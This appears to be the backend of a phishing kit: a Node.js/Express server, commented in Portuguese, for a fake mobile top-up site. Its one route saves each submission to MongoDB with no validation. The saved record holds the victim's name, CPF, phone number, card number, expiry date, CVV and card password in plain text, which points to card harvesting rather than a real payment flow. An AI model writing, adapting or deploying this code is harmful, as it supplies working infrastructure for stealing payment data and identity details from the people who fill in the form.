const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONECTAR AO BANCO (Substitua SENHA_AQUI pela sua senha real do MongoDB)
mongoose.connect('mongodb+srv://mateus:SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('Banco de Dados Conectado!'))
  .catch(err => console.error(err));

// MODELO DE DADOS COM CPF
const RecargaSchema = new mongoose.Schema({
    operadora: String, nome: String, cpf: String, telefone: String,
    valor: String, cartao: String, data: String, cvv: String, senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).send('OK');
    } catch (e) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));